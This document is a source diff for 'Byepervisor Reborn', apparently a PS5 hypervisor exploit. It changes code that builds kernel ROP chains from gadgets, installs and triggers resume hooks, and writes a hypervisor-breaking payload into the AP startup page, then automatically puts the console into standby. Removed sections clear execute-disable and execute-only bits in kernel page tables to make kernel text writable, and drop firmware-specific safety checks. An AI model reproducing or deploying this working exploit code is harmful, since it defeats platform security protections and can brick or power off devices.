@@ -11,7 +11,6 @@
 #include "khook.h"
 #include "util.h"
 #include "paging.h"
-#include "issue9_diag.h"
 
 #include "break_hv_payload/break_hv.h"
 
@@ -21,32 +20,14 @@
 #define HOOK_IST                  6
 #define CAVE_STATE_OFF            0x600
 #define CAVE_SAVE_OFF             0x620
-#define CAVE_PREP_OFF             0x680
-#define CAVE_STASH_OFF            ISSUE9_PROD_STASH_OFF
 #define TSS_STRIDE                0x68
 #define STARTUP_MP_PAYLOAD_PAGE   0x3FFFF000
-
-#define PREP_MARK                 0x315045525054584BULL /* "KXTPREP1" */
-#define CHAIN_MARK                0x434841494E2D3031ULL /* "CHAIN-01" */
-#define MARK_ENTERED              0x454E544552454431ULL /* "ENTERED1" */
-#define MARK_DONE                 0x444F4E452D415031ULL /* "DONE-AP1" */
-#define MODE_STRIKE               0x31454B4952545356ULL /* "VSTRIKE1" */
-#define AP_MODE_1160              0x313631312D504142ULL /* "BAP-1161" */
-#define AP_MODE_0860              0x303638302D504142ULL /* "BAP-0860" */
 
 #define HV_LOADER_PA_REGULAR      0x062800000
 #define HV_LOADER_PA_PRO          0x8e0800000
 
-/* Firmwares whose fixed hypervisor heap / PCPU globals read as zero inside
- * the startup AP window. These must use runtime VMCB discovery rather than
- * the legacy fixed-global path; storing a zero global offset would hand the
- * AP payload a bogus heap base. 11.60 confirmed this by measurement, 8.60
- * carries the same posture and needs the same confirmation. */
-#define FW_USES_RUNTIME_VMCB(fw_)                            \
-  ((((fw_) & 0xffff0000U) == 0x11600000U) ||                 \
-   (((fw_) & 0xffff0000U) == 0x08600000U))
-
 uint64_t g_hv_base_pa;
+int sceSystemStateMgrEnterStandby(void);
 
 static int install_test_hook(int core_id, uint64_t cave)
 {
@@ -118,10 +99,14 @@ static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
 
   oracle = kh_user_data_addr(&hook);
   kh_chain_init(&chain, chain_buf, sizeof chain_buf);
-  if (FW_USES_RUNTIME_VMCB(kernel_get_fw_version()))
-    kh_chain_store(&chain, oracle + 0x20, CHAIN_MARK);
-  else
-    kh_chain_store(&chain, oracle, COOKIE_VAL);
+  kh_chain_store(&chain, oracle, COOKIE_VAL);
+
+  kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
+  kh_chain_q(&chain, cr3);
+
+  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
+  kh_chain_q(&chain, oracle + 0x08);
+  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);
 
   kh_chain_memcpy(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE), kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, 0xF00);
 
@@ -129,42 +114,24 @@ static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
   kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF08), kdldmap(0));
   kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF10), oracle);
 
-  if (FW_USES_RUNTIME_VMCB(kernel_get_fw_version())) {
-    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18),
-                   HV_LOADER_PA_REGULAR);
-    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20),
-                   cave + CAVE_STASH_OFF);
-    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28), set_rsi);
-    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF30), cr3);
-    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF38),
-                   (kernel_get_fw_version() & 0xffff0000U) == 0x08600000U
-                     ? AP_MODE_0860 : AP_MODE_1160);
-  } else {
-    // carveout addr
-    if (g_hv_base_pa == HV_LOADER_PA_PRO)
-      kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa - 0x800000);
-    else
-      kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa);
+  // carveout addr
+  if (g_hv_base_pa == HV_LOADER_PA_PRO)
+    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa - 0x800000);
+  else
+    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa);
 
-    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20), g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE));
-    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28), g_hv_base_pa + rawoff(HV_SYM_PCPUS));
-    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF38), 0);
-  }
+  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20), g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE));
+  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28), g_hv_base_pa + rawoff(HV_SYM_PCPUS));
 
-  printf("[+] install_resume_hook: handler chain is 0x%lx bytes\n",
-         (unsigned long)chain.len);
   ret = kh_install(&hook, &chain);
   if (ret) return ret;
-  printf("[+] install_resume_hook: hook image installed\n");
 
-  /* Save a recoverable baseline before triggering the debug-register chain. */
+  kh_trigger(&hook);
+  
   kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
   kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
   kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
   kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
-  printf("[+] install_resume_hook: triggering arm chain\n");
-  kh_trigger(&hook);
-  printf("[+] install_resume_hook: arm chain returned\n");
   return 0;
 }
 
@@ -181,210 +148,6 @@ static void uninstall_hook(int core_id, uint64_t cave)
   kh_disarm(&hook);
   kh_restore(&hook);
   kwrite64(cave + CAVE_STATE_OFF, 0);
-}
-
-static int make_payload_page_executable(uint64_t kernel_pmap)
-{
-  uint64_t addr = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
-  uint64_t entry_addr, entry;
-
-  entry_addr = find_pml4e(kernel_pmap, addr, &entry);
-  if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
-    return -1;
-  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
-  kwrite64(entry_addr, entry);
-
-  entry_addr = find_pdpe(kernel_pmap, addr, &entry);
-  if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
-    return -2;
-  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
-  kwrite64(entry_addr, entry);
-  if (PDE_FIELD(entry, PS) == 1)
-    return 0;
-
-  entry_addr = find_pde(kernel_pmap, addr, &entry);
-  if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
-    return -3;
-  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
-  kwrite64(entry_addr, entry);
-  if (PDE_FIELD(entry, PS) == 1)
-    return 0;
-
-  entry_addr = find_pte(kernel_pmap, addr, &entry);
-  if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
-    return -4;
-  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
-  kwrite64(entry_addr, entry);
-  return 0;
-}
-
-static uint64_t enable_kernel_text_access_1160(uint64_t kernel_pmap)
-{
-  uint64_t changed = 0;
-
-  for (uint64_t addr = ktext(0); addr < KERNEL_ADDRESS_DATA_BASE;
-       addr += 0x1000) {
-    uint64_t entry_addr, entry, updated;
-
-    entry_addr = find_pde(kernel_pmap, addr, &entry);
-    if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
-      continue;
-    updated = entry;
-    CLEAR_PDE_BIT(updated, XOTEXT);
-    SET_PDE_BIT(updated, RW);
-    if (updated != entry) {
-      kwrite64(entry_addr, updated);
-      changed++;
-    }
-    if (PDE_FIELD(entry, PS) == 1)
-      continue;
-
-    entry_addr = find_pte(kernel_pmap, addr, &entry);
-    if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
-      continue;
-    updated = entry;
-    CLEAR_PDE_BIT(updated, XOTEXT);
-    SET_PDE_BIT(updated, RW);
-    if (updated != entry) {
-      kwrite64(entry_addr, updated);
-      changed++;
-    }
-  }
-  return changed;
-}
-
-static int result_1160_done(uint64_t cave)
-{
-  uint64_t oracle = cave + KH_OFF_USER;
-  return kread64(oracle + 0x00) == MARK_ENTERED &&
-         kread64(oracle + 0x08) == MODE_STRIKE &&
-         kread64(oracle + 0x18) == MARK_DONE;
-}
-
-static int result_1160_success(uint64_t cave)
-{
-  uint64_t ext = cave + CAVE_STASH_OFF;
-  return kread64(cave + CAVE_PREP_OFF) == PREP_MARK &&
-         result_1160_done(cave) &&
-         kread64(ext + 0x00) == 0 &&
-         kread64(ext + 0x10) == 1 &&
-         kread64(ext + 0x18) == 16 &&
-         kread64(ext + 0x40) == 16 &&
-         kread64(ext + 0x48) == 16;
-}
-
-static void print_result_1160(uint64_t cave)
-{
-  uint64_t oracle = cave + KH_OFF_USER;
-  uint64_t ext = cave + CAVE_STASH_OFF;
-
-  printf("[11.60] chain=%016lx entered=%016lx mode=%016lx done=%016lx\n",
-         kread64(oracle + 0x20), kread64(oracle + 0x00),
-         kread64(oracle + 0x08), kread64(oracle + 0x18));
-  printf("[11.60] error=%lu self=%016lx self_count=%lu targets=%lu\n",
-         kread64(ext + 0x00), kread64(ext + 0x08),
-         kread64(ext + 0x10), kread64(ext + 0x18));
-  printf("[11.60] written=%lu verified=%lu\n",
-         kread64(ext + 0x40), kread64(ext + 0x48));
-}
-
-static int prove_result_1160(uint64_t cave)
-{
-  uint64_t first;
-  uint8_t *bytes;
-
-  if (!result_1160_success(cave)) {
-    notifyf("[ERROR] Byepervisor Reborn 11.60\nResume strike was not verified");
-    return 7;
-  }
-
-  first = kread64(ktext(0));
-  bytes = (uint8_t *)&first;
-  printf("[11.60] kernel text first qword=%016lx\n", first);
-  kHexDump(ktext(0), 0x60);
-  notifyf("Byepervisor Reborn 11.60 succeeded\nKernel .text: %02x %02x %02x %02x %02x %02x %02x %02x",
-          bytes[0], bytes[1], bytes[2], bytes[3],
-          bytes[4], bytes[5], bytes[6], bytes[7]);
-  return 0;
-}
-
-static int run_1160(uint64_t cave)
-{
-  uint64_t oracle = cave + KH_OFF_USER;
-  uint64_t ext = cave + CAVE_STASH_OFF;
-  uint64_t kernel_pmap, kernel_pm_cr3, changed;
-  uint64_t zeroes[16] = {0};
-  int r;
-
-  if (pin_to_core(HOOK_CORE) != 0 || get_cpu_core() != 15) {
-    printf("[11.60] failed to pin scheduler CPU 15 / TSS index 0\n");
-    notifyf("[ERROR] Byepervisor Reborn 11.60\nCore pin failed");
-    return 2;
-  }
-
-  if (issue9_production_is_armed(cave)) {
-    if (result_1160_done(cave)) {
-      print_result_1160(cave);
-      if (issue9_production_cleanup(cave)) {
-        notifyf("[ERROR] Byepervisor Reborn 11.60\nHook cleanup failed");
-        return 6;
-      }
-      printf("[11.60] hardened hook restored\n");
-      return prove_result_1160(cave);
-    }
-    printf("[11.60] resume hook is already armed\n");
-    notifyf("Byepervisor Reborn 11.60\nEnter rest mode and resume");
-    goto wait_for_resume;
-  }
-
-  if (result_1160_done(cave)) {
-    print_result_1160(cave);
-    if (result_1160_success(cave))
-      return prove_result_1160(cave);
-    notifyf("[ERROR] Byepervisor Reborn 11.60\nPrevious resume strike failed");
-    return 8;
-  }
-
-  kwrite(oracle, zeroes, 8 * sizeof(uint64_t));
-  kwrite(ext, zeroes, 10 * sizeof(uint64_t));
-  kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
-  kernel_pm_cr3 = kread64(kernel_pmap + 0x28);
-  r = make_payload_page_executable(kernel_pmap);
-  if (r) {
-    printf("[11.60] payload page walk failed: %d\n", r);
-    notifyf("[ERROR] Byepervisor Reborn 11.60\nPayload page walk failed (%d)", r);
-    return 3;
-  }
-
-  changed = enable_kernel_text_access_1160(kernel_pmap);
-  kwrite64(cave + CAVE_PREP_OFF, PREP_MARK);
-  printf("[11.60] prepared %lu kernel page-table entries\n", changed);
-
-  r = issue9_production_arm(cave, kernel_pm_cr3, HV_LOADER_PA_REGULAR,
-                            break_hv, break_hv_len);
-  if (r) {
-    printf("[11.60] hook installation failed: %d\n", r);
-    notifyf("[ERROR] Byepervisor Reborn 11.60\nHook install failed (%d)", r);
-    return 4;
-  }
-
-  printf("[11.60] hook armed; enter rest mode and resume\n");
-  notifyf("Byepervisor Reborn 11.60 armed\nEnter rest mode and resume");
-
-wait_for_resume:
-  for (;;) {
-    pin_to_core(HOOK_CORE);
-    if (result_1160_done(cave)) {
-      print_result_1160(cave);
-      if (issue9_production_cleanup(cave)) {
-        notifyf("[ERROR] Byepervisor Reborn 11.60\nHook cleanup failed");
-        return 6;
-      }
-      printf("[11.60] hardened hook restored\n");
-      return prove_result_1160(cave);
-    }
-    sceKernelSleep(2);
-  }
 }
 
 int main(void)
@@ -411,11 +174,15 @@ int main(void)
 
   // Do a quick firmware version detect, if we don't have offsets for it, goodbye!
   fw = kernel_get_fw_version();
-  printf("[+] Detected firmware: %x.%x\n", (fw & 0xFF000000) >> 0x18, (fw & 0x00FF0000) >> 0x10);
+  printf("[+] Detected firmware: %x.%02x\n", (fw & 0xFF000000) >> 0x18, (fw & 0x00FF0000) >> 0x10);
 
   if (kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL) == 0) {
     printf("[!] Undetected firmware, exiting!\n");
     notifyf("[ERROR] Byepervisor Reborn\nFirmware is not supported :(\n");
+    /* SAFETY: this return is missing upstream. Without it the
+     * "unsupported firmware" path falls straight through into the
+     * exploit with a NULL hook target, enters rest mode, and hard
+     * power-offs the console. Reproduced on a slim 8.60 unit. */
     return 1;
   }
 
@@ -436,45 +203,6 @@ int main(void)
 
   cave   = kdlsym(KERNEL_SYM_DATA_CAVE);
   oracle = cave + KH_OFF_USER;
-
-  if ((fw & 0xffff0000U) == 0x08600000U) {
-    /* The 8.60 offset table ships empty. Reach this line only if it has
-     * been derived and validated; otherwise kdlsym() above already bailed. */
-    printf("[8.60] offset table marked validated, proceeding\n");
-    if (g_hv_base_pa == HV_LOADER_PA_PRO) {
-      /* Same posture as 11.60: the runtime VMCB discovery bounds in this
-       * port have not been surveyed against the Pro physical layout, and
-       * writing there unproven is exactly the failure we refuse. */
-      printf("[8.60] Pro physical layout has not been validated\n");
-      notifyf("[ERROR] Byepervisor Reborn 8.60\nPS5 Pro is not yet validated");
-      return 9;
-    }
-  }
-
-  if ((fw & 0xffff0000U) == 0x11600000U) {
-    if (g_hv_base_pa == HV_LOADER_PA_PRO) {
-      printf("[11.60] Pro physical layout has not been validated\n");
-      notifyf("[ERROR] Byepervisor Reborn 11.60\nPS5 Pro is not yet validated");
-      return 9;
-    }
-#if defined(ISSUE9_DIAG) || defined(ISSUE9_DR0_DIAG) || defined(ISSUE9_RESUME_DIAG) || defined(ISSUE9_RESUME_ABORT)
-    if (pin_to_core(HOOK_CORE) != 0 || get_cpu_core() != 15) {
-      printf("[issue9] failed to pin scheduler CPU 15 / TSS index 0\n");
-      return 10;
-    }
-#if defined(ISSUE9_RESUME_ABORT)
-    return issue9_resume_abort_run(cave);
-#elif defined(ISSUE9_RESUME_DIAG)
-    return issue9_resume_diag_run(cave);
-#elif defined(ISSUE9_DR0_DIAG)
-    return issue9_dr0_diag_run(cave);
-#else
-    return issue9_diag_run(cave);
-#endif
-#else
-    return run_1160(cave);
-#endif
-  }
 
   pin_to_core(HOOK_CORE);
 
@@ -596,7 +324,9 @@ int main(void)
     }
 
     printf("[+] Hook installed, enter sleep and resume!\n");
-    notifyf("Byepervisor Reborn\nEnter sleep and resume!\n");
+    notifyf("Byepervisor Reborn\nEntering rest mode in 3 secs\n");
+    sleep(3);
+    sceSystemStateMgrEnterStandby();
   } else {
     printf("khook: hook already ARMED (state survived)\n");
   }
